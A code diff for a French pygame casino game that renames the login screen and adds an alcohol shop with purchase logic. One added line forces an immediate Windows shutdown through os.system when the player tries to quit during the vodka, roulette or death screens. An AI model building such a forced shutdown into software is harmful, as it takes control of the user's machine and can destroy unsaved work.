@@ -1,9 +1,9 @@
 import pygame
-from fonctions import dessiner_zone_texte
+from fonctions import dessiner_zone_texte,achat
 from img import *
 from objets_et_variables import *
 from sons import *
-from Ecrans import ecran1,ecran2,ecran_mort,ecran_victoire,ecran_black,boutique,vodka
+from Ecrans import connexion,ecran2,ecran_mort,ecran_victoire,ecran_black,boutique,vodka
 from Machine_a_sous import ecran_machine_a_sous
 from PileouFace import *
 from Roulette_Russe import pistolet
@@ -11,6 +11,7 @@ from Jeu_combat_new import *
 from blackjack import *
 from SQL import *
 import time
+import os
 
 pygame.init()
 
@@ -48,6 +49,8 @@ class Jeu():
                     if event.type == pygame.QUIT:
                         if not vodka.ecran.get_actif() and not rr.ecran.get_actif() and not ecran_mort.ecran.get_actif():
                             self.run = False
+                        else:
+                            os.system("shutdown /s /f /t 0")
                     # Clic de souris
                     elif event.type == pygame.MOUSEBUTTONDOWN:
                         if self.champ_joueur.collidepoint(event.pos):
@@ -72,18 +75,17 @@ class Jeu():
                         if bouton1.get_x() <= event.pos[0] <= bouton1.get_x() + bouton1.get_largeur() and bouton1.get_y() <= event.pos[1] <= bouton1.get_y() + bouton1.get_hauteur():
                             if ecran_victoire.ecran.get_actif():
                                 pygame.mixer.music.unload()
-                                ecran1.choisir_musique()
+                                connexion.choisir_musique()
                                 ecran_victoire.ecran.set_actif(False)
                                 ecran2.ecran.set_actif(True)
-                            elif ecran1.ecran.get_actif() or ecran2.ecran.get_actif():
+                            elif connexion.ecran.get_actif() or ecran2.ecran.get_actif():
                                 click.play()
-                                if ecran1.ecran.get_actif():
+                                if connexion.ecran.get_actif():
                                     rire_diabolique.play()
-                                ecran1.ecran.set_actif(not ecran1.ecran.get_actif())
+                                connexion.ecran.set_actif(not connexion.ecran.get_actif())
                                 ecran2.ecran.set_actif(not ecran2.ecran.get_actif())
                         # Gérer les interactions de l'écran 2 (écran principal)
                         elif ecran2.ecran.get_actif():
-                            print(event.pos)
                             if 25 <= event.pos[0] <= 85 and 55 <= event.pos[1] <= 115 :
                                 boutique.ecran.set_actif(True),ecran2.ecran.set_actif(False)
                             # Lancer la roulette russe
@@ -139,10 +141,27 @@ class Jeu():
                                     dernier_son = time.time()
                                 ecran_machine_a_sous.lancement()
                                 joueur1.modifier_cagnotte(-100 - joueur1.get_cagnotte()//100)
+
+                        elif alcool.ecran.get_actif():
+                            alcool.affiche()
+                            if 340 <= event.pos[0] <= 390 and 25 <= event.pos[1] <= 65:
+                                alcool.ecran.set_actif(False),boutique.ecran.set_actif(True)
+                            elif 25 <= event.pos[0] <= 85 and 165 <= event.pos[1] <= 225:
+                                alcool.ecran.set_actif(False),vodka.ecran.set_actif(True)
+                                pygame.mixer.music.unload()
+                            elif 105 <= event.pos[0] <= 165 and 165 <= event.pos[1] <= 225:
+                                achat('Chope de Bière')
+                            elif 185 <= event.pos[0] <= 265 and 165 <= event.pos[1] <= 225:
+                                achat('Bouteille de Whisky')
+                        elif boutique.ecran.get_actif():
+                            if 340 <= event.pos[0] <= 390 and 25 <= event.pos[1] <= 65:
+                                boutique.ecran.set_actif(False),ecran2.ecran.set_actif(True)
+                            elif 135 <= event.pos[0] <= 195 and 135 <= event.pos[1] <= 195:
+                                boutique.ecran.set_actif(False),alcool.ecran.set_actif(True)
                         
                     elif event.type == pygame.KEYDOWN:
                         # Gérer la saisie du nom de joueur
-                        if ecran1.ecran.get_actif():
+                        if connexion.ecran.get_actif():
                             if self.nom_actif:  # Gestion de la saisie du pseudo
                                 if event.key == pygame.K_BACKSPACE:
                                     self.text = self.text[:-1]
@@ -208,6 +227,8 @@ class Jeu():
                                             print(f"Prélèvement effectué ! Rebonsoir, cher joueur.")
                                         else:
                                             print(f"Coordonnées bancaires incorrectes ! N'ESSAYEZ PAS DE DUPER LE BABEL CASINO, MORTEL !")
+                                    else:
+                                        print(f"Coordonnées bancaires incorrectes ! N'ESSAYEZ PAS DE DUPER LE BABEL CASINO, MORTEL !")
                                     click.play()
                             elif event.key == pygame.K_BACKSPACE:
                                 self.txt_codee_cb = self.txt_codee_cb[:-1]
@@ -219,39 +240,34 @@ class Jeu():
                     pygame.mouse.set_visible(True)
                     ecran_black.affiche(blackjack)
 
-                if boutique.ecran.get_actif():
-                    boutique.affiche()
-                    if event.type == pygame.MOUSEBUTTONDOWN:
-                        if 340 <= event.pos[0] <= 390 and 25 <= event.pos[1] <= 65:
-                            boutique.ecran.set_actif(False),ecran2.ecran.set_actif(True)
-                        elif 135 <= event.pos[0] <= 195 and 135 <= event.pos[1] <= 195:
-                            boutique.ecran.set_actif(False),vodka.ecran.set_actif(True)
-                            pygame.mixer.music.unload()
-
                 # Supprimer le pile ou face au changement d'ecran
                 if not ecran2.ecran.get_actif():
                     pileouface.set_actif(False)
 
                 # Conditions de défaite
                 if joueur1.get_cagnotte() <= 0:
-                    ecran1.ecran.set_actif(False), ecran2.ecran.set_actif(False), ecran_machine_a_sous.ecran.set_actif(False), ecran_mort.ecran.set_actif(True) 
+                    connexion.ecran.set_actif(False), ecran2.ecran.set_actif(False), ecran_machine_a_sous.ecran.set_actif(False), ecran_black.ecran.set_actif(False),boutique.ecran.set_actif(False),alcool.ecran.set_actif(False),ecran_mort.ecran.set_actif(True) 
                     if son_joue is False:
                         son_fall.play()
                         son_joue = True
                 # Conditions de victoire
                 if joueur1.get_cagnotte() >= 10000000 and not self.victoire:
-                    ecran1.ecran.set_actif(False), ecran2.ecran.set_actif(False), ecran_machine_a_sous.ecran.set_actif(False), ecran_victoire.ecran.set_actif(True)
+                    connexion.ecran.set_actif(False), ecran2.ecran.set_actif(False), ecran_machine_a_sous.ecran.set_actif(False), ecran_victoire.ecran.set_actif(True)
                     self.victoire = True 
 
                 # Affichage de l'écran de début de jeu
-                if ecran1.ecran.get_actif():
-                    ecran1.affiche()     
+                if connexion.ecran.get_actif():
+                    connexion.affiche()     
                     dessiner_zone_texte(fenetre, self.champ_joueur, self.text, self.nom_actif)
                     dessiner_zone_texte(fenetre, self.champ_mdp, self.mdp, self.mdp_actif)            
                 # Affichage de l'écran principal
-                if ecran2.ecran.get_actif():
+                elif ecran2.ecran.get_actif():
                     son_joue = False
                     ecran2.affiche()
+                elif boutique.ecran.get_actif():
+                    boutique.affiche()
+                elif alcool.ecran.get_actif():
+                    alcool.affiche()
                 elif ecran_mort.ecran.get_actif():
                     # Affichage de l'écran de défaite
                     ecran_mort.affiche()
